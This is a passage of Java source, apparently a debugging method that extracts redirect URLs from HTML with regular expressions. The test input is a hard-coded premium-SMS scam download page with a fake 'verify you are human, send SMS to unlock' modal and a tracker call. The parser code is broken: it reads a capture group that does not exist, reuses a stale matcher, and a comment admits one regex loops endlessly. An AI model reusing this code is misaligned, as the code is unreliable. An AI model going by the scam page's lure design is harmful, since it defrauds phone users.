CIwMDMyNDY4OTAwOTQwXCIsXCIwMDY3NDU1OTcwNTVcIixcIjAwNjc0NTU5OTEyMFwiLFwiMDA2NzQ1NTk2NjcwXCIsXCIwMDY3Njg0ODIzNzBcIixcIjAwNjc4NTk5ODMwOVwiLFwiMDA2ODU3MjE1Njc0XCIsXCIwMDQ4NzgwMjA3MDMwXCIsXCIwMDc3NjI1MzEwNzAwXCIsXCIwMDkwNTEwMjY2MTA1NFwiLFwiMDAyNTg4NTI4OTQ3MDBcIixcIjAwMjU4ODMwMDAwNjAwXCIsXCIwMDIzNjc3MDAwNjgwXCIsXCIwMDI0Mzg4NTAwMDM4MFwiLFwiMDAyMzQ3MDAwMDAwNjgwXCIsXCIwMDMyNDY4OTAxMzMyXCIsXCIwMDMyNDY3NDAyMDgxXCIsXCIwMDI0MzgwOTcwMDQxNVwiLFwiMDAzNzI1ODk5MDUzMFwiLFwiMDA3OTU4NTM4ODU3N1wiLFwiMDA0MTc5OTc3MDU2MFwiLFwiMDAzNDcwMDMwMDMzMFwiLFwiMDA2NzY4NDgwMjQwXCIsXCIwMDY3ODU1OTQyMzBcIixcIjAwNDU5MTIwODcyOVwiLFwiMDAzNTg0NTcxMjgxMFwiLFwiMDA0OTE1NTU1MTg4MDE1XCIsXCIwMDI2NTIxMjM0MTU2MFwiLFwiMDAzNzM5MDA0MDA4NFwiLFwiMDA2NzQ1NTkyNzIwXCIsXCIwMDMxNjg5OTU4MjY4XCIsXCIwMDY3NTcwODkwMzUwXCIsXCIwMDMyNDYzMDI2MjE1XCIsXCIwMDY3ODU1OTU0MzBcIixcIjAwNDkxNTU1NTE4ODAzNVwiLFwiMDA2NDkzMDkzNjk2MDMzXCIsXCIwMDY0ODIyMjU1NTAyOVwiLFwiMDA2NDc5Njg4Mjc4NjgxXCIsXCIwMDQ2NzI1MzA4MzAxXCIsXCIwMDQ2NzIyNDgzOTYwXCIsXCIwMDQ2NzAyNDc1OTMxXCIsXCIwMDQ2NzAyNDU0NDMwXCIsXCIwMDQ2NzAyNDUxNjI3XCIsXCIwMDk2NDc4MzIzMDA1NDJcIixcIjAwOTY0NzgzMjIxOTUzOFwiLFwiMDA5NjQ3ODMyMTcwMjU0XCIsXCIwMDk2NDc4MzIwNDcyNzhcIixcIjAwOTY0NzgzMTE5NTI5OFwiLFwiMDA5NjQ3NzQwNTAzNTk4XCIsXCIwMDk2NDc3Mzk1NDcxNTFcIixcIjAwOTY0NzczNjMxMzg0MFwiLFwiMDA5NjA5OTk4MzE0XCIsXCIwMDk2MDk5OTMxNTdcIixcIjAwOTYwOTk0NjIwNFwiLFwiMDA5NjA5OTMwMTczXCIsXCIwMDk2MDk4MjQ1NzNcIixcIjAwOTYwOTgxODgyN1wiLFwiMDA5NjQ3NTA0ODAwMDUzXCIsXCIwMDk2NDc1MDQ4NzM1NDRcIixcIjAwOTY0NzUwMzY4MjM1N1wiLFwiMDA5NjQ3NTAyMDc4NzA1XCIsXCIwMDY3OTUxOTQ1MTBcIixcIjAwMzcyNTg5OTIyMjBcIixcIjAwNDg3ODAyMDMxMjJcIixcIjAwMzcwNjY0MDAyODFcIixcIjAwNDQ3NDUyMzE4NzAxXCIsXCIwMDQ0NzUzNzYwOTkxMVwiLFwiMDAzMjc3MDAwOTAwMDA2NTFcIixcIjAwMzI0Njg5MDExMTBcIixcIjAwMzI0Njg5MDAzMDVcIixcIjAwMjM2Nzc4MDA5MDBcIixcIjAwMjQzODA5NzAwMTY1XCIsXCIwMDIyNDc5MTExMjUxMlwiLFwiMDAyNjUyMTIzNDEwMDBcIixcIjAwMjQzMTMzMjAyMVwiLFwiMDA3NzYyNTMxMTMwMFwiLFwiMDAyNDM3NzAwMjMxXCIsXCIwMDM3MzkwMDQwMDAwXCIsXCIwMDQ0NzAwMDAwMDAwMFwiLFwiMDA0NDc0MTg0OTU0MDdcIixcIjAwNDQ3NDUyMjIxNjA3XCIsXCIwMDQ0NzYyNDEyNjMyOFwiLFwiMDA0NDc0MTg0MjAwMjBcIixcIjAwNDQ3NDQxMDAxMzA4XCIsXCIwMDQ0NzkyNDgwMDkyN1wiLFwiMDA0NDc5MjQxNDAzMDdcIixcIjAwNDQ3NDUyMDAzNTEwXCIsXCIwMDQ0NzkyNDA4NzkwN1wiLFwiMDA0NDc1NTk1NTIwMjBcIixcIjAwNDQ3NjY5MzcwMDI5XCIsXCIwMDM3MjU4OTkwMjg4XCIsXCIwMDM3MDY5NzQ2MDcxXCIsXCIwMDc5OTIwMzA4MTAzXCIsXCIwMDM3MDY2NDUwNjAwXCIsXCIwMDM3MDY2NDkyMTMxXCIsXCIwMDM3MDY2NTQxMTMxXCIsXCIwMDM3MDY2NjUxMDExXCIsXCIwMDc5NTg1Mzg4MzQwXCIsXCIwMDc5NTg1Mzg5NDU1XCIsXCIwMDc5Njk3NTMwNjc2XCIsXCIwMDc5Njk3NTMxMzkxXCIsXCIwMDQ0NzQ1MjIyMTYyNVwiLFwiMDA0NDc2NDAxMTE0OTBcIixcIjAwNDQ3NTU5NTAxMzMwXCIsXCIwMDQ0NzQwNjU2MDE0MFwiLFwiMDA0NDc2NjkzOTIwMjBcIixcIjAwNDQ3NDA2NTkzMDAwXCIsXCIwMDQ0NzY0MDE1MjEwMFwiLFwiMDAwXCIsXCIwMDI2Mzc4NzExMjEzMFwiXSIsImRldiI6ImFuZHJvaWQiLCJwZXJjZW50IjowLCJhZiI6IjUwMDEwMzY1NTgzOTk1NTAiLCJpc3MiOiJjbGljazJzbXMiLCJleHAiOjE1NTk3MTE0NjQsImlhdCI6MTU1OTcwNzg2NCwiaXNwIjoiYWN0IGZpYmVybmV0IiwiY29udGVudF90eXBlIjoiZ2FtZXMiLCJhdmFpbGFibGUiOjEwMTYsImlkc19zZXJ2ZWQiOjEwMTZ9.0YuHHX2vTPHnh7HEQaYNCmvoH-oC0y3YHm4p5rVmlI4'&gt;&lt;buttonid='content-button'&gt;Accesstocontent&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;&lt;divid='cont-content-loader'&gt;&lt;divclass='lds-default'&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;ContentReady&lt;br&gt;WaitingyourSMS&lt;/p&gt;&lt;/div&gt;&lt;divclass='button'id='button'&gt;Download&lt;/div&gt;&lt;pclass='footer'&gt;?Downloader-AboutDownloader-&lt;ahref='terms.php?groupds=1'&gt;Terms&lt;/a&gt;&lt;/p&gt;&lt;divclass='modal'id='modal'&gt;&lt;divclass='content'&gt;&lt;divclass='modal-header'&gt;&lt;imgsrc='http://cdn.clean-download.com/groupds/1/assets/img/unlock.png'alt='UnlockIMG'&gt;&lt;h5&gt;Verifyyouarehuman&lt;/h5&gt;&lt;/div&gt;&lt;p&gt;SendSMStoverifyyouarehumanandunlockthedownload&lt;/p&gt;&lt;buttonclass='send-sms'id='send-sms'&gt;Unlock&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;document.addEventListener('DOMContentLoaded',function(event){startModalTimer();functionstartModalTimer(){setTimeout(function(){openModal();},5000);}functionopenModal(){document.getElementById('modal').style.display='block';document.getElementById('button').style.animation='none';}document.getElementById('button').onclick=function(){openModal();};document.getElementById('send-sms').onclick=function(){varxhr=newXMLHttpRequest();xhr.open('GET','makeTracker.php?a=WEBSMS&amp;s=5001036558399550&amp;t=1559707864&amp;c=IN&amp;randKey=5001036558399550');xhr.onload=function(){if(xhr.status===200){window.location.href=urlTo;//document.getElementById('step1').style.display='none';//document.getElementById('step2').style.display='none';//document.getElementById('modal').style.display='none';//document.getElementById('cont-content-loader').style.display='block';////setTimeout(function(){//document.getElementById('modal').style.display='none';//document.getElementById('cont-content-loader').style.display='none';//document.getElementById('cont_content_link').style.display='block';//},30000);}};xhr.send();}});&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ");

		logger.info(sBuffer.toString());

		String content = sBuffer.toString();

		String location = "";

		// location 和 content 都为空,返回null
		if (StringUtils.isEmpty(content)) {
			return;
		}

		String reg = "(.*?)//(.*?)http(.*+)";

		if (StringUtils.isNotEmpty(content)) {

			long startTime = System.currentTimeMillis() / 1000;

			// 先判断使用refresh的方式进行跳转的
			content = content.replace("\"", "'").replace(" ", "");
			reg = "<meta(.*?)'refresh'content='(.*?)url=([\\s\\S]*?)'";
			Matcher m = Pattern.compile(reg, Pattern.CASE_INSENSITIVE).matcher(content);
			if (m.find()) {
				location = m.group(3);
				if (StringUtils.startsWithIgnoreCase(location, "http") || StringUtils.startsWithIgnoreCase(location, "/")) {
					logger.info(location);
				}
			}

			long thisTime = System.currentTimeMillis() / 1000;

			if ((thisTime - startTime) > 10) {
				logger.info(String.valueOf(thisTime -startTime));
			}
			// js 方式 用户自定义的
			//			location = this.customFilterUrl(content, url);

			long endTime = System.currentTimeMillis() / 1000;
			if ((endTime - thisTime) > 10) {
				logger.info(String.valueOf(endTime - thisTime));

			}
			if (!StringUtils.isEmpty(location)) {
				logger.info(location);
			}

			thisTime = System.currentTimeMillis() / 1000;

			// 再判断使用js方式进行跳转的
			// 这个正则似乎也有也有问题，陷入了死循环
			reg = "(.*?)location.(.*?)'(.*?)'";
			m = Pattern.compile(reg, Pattern.CASE_INSENSITIVE).matcher(content);
			if (m.find()) {
				location = m.group(3);
				if (StringUtils.startsWithIgnoreCase(location, "http") || StringUtils.startsWithIgnoreCase(location, "/")) {
					logger.info(location);
				}
			}

			endTime = System.currentTimeMillis() / 1000;

			if ((endTime - thisTime) > 10) {
				logger.info(location);
			}
			thisTime = System.currentTimeMillis() / 1000;

			// 获取location= 的url；
			reg = "location='(.*?)'";
			m = Pattern.compile(reg, Pattern.CASE_INSENSITIVE).matcher(content);
			if (m.find()) {
				location = m.group(2);
				if (StringUtils.startsWithIgnoreCase(location, "http") || StringUtils.startsWithIgnoreCase(location, "/")) {
					logger.info(location);
				}
			}

			endTime = System.currentTimeMillis() / 1000;
			if ((endTime - thisTime) > 10) {
				logger.info(String.valueOf(endTime - thisTime));
			}
			// 再判断相对比较极端的方式,直接获取字符串中的链接,格式为"http://abc.com"

			// 替换掉w3c的内容
			// String replaceRegex =
			// "^([hH][tT]{2}[pP]:/*|[hH][tT]{2}[pP][sS]:/*){1}[//][w]{3}[.](w3c[.]){1}";
			// Pattern pattern = Pattern.compile(replaceRegex);
			// if (pattern.matcher(replaceRegex).matches()) {
			// content = content.replace(replaceRegex, "");
			// }
			// content = StringUtils.replace(content,
			// "http:////www.w3.org", "");

			content = StringUtils.replace(content, "http://www.w3.org", "");
			content = StringUtils.replace(content, "http://www.wapforum.org", "");
			content = StringUtils.replace(content, "//www.w3.org", "");
			content = StringUtils.replace(content, "//www.wapforum.org", "");

			thisTime = System.currentTimeMillis() / 1000;
			reg = "(.*?)location.href='(.*?)'";
			m = Pattern.compile(reg, Pattern.CASE_INSENSITIVE).matcher(content);
			if (m.find()) {
				location = m.group(2);
				logger.info(location);
			}

			endTime = System.currentTimeMillis() / 1000;
			if ((endTime - thisTime) > 10) {
				//				logger.info("使用js3跳转正则耗时： " + (endTime - thisTime) + " 秒");
				//				logger.info(content);
			}
			thisTime = System.currentTimeMillis() / 1000;
			reg = "(.*?)http(.*?)'";
			if (m.find()) {
				location = "http" + m.group(2);
			}
			endTime = System.currentTimeMillis() / 1000;
			if ((endTime - thisTime) > 10) {
			}
			if (StringUtils.contains(content, "http")) {
			}

			// 定制自定义的返回结果。
			// location = this.parseContent(content, schema, host);
			// if (!StringUtils.isEmpty(location)) {
			// System.out.println(location);
			// }

			thisTime = System.currentTimeMillis() / 1000;
			// 实在没办法,判断/page.php?a=1&b=2格式的字符串
			reg = "(.*?)'/(.*?)\\??(.*?)'(.*?)";
			m = Pattern.compile(reg, Pattern.CASE_INSENSITIVE).matcher(content);
			if (m.find()) {
				//				location = schema + "://" + host + "/" + m.group(2) + "?" + m.group(3);
				return  ;
			}
			endTime = System.currentTimeMillis() / 1000;
			if ((endTime - thisTime) > 10) {
				//				logger.info("使用js5跳转正则耗时： " + (endTime - thisTime) + " 秒");
				//				logger.info(content);
			}
			return  ;
		}
	}
}
	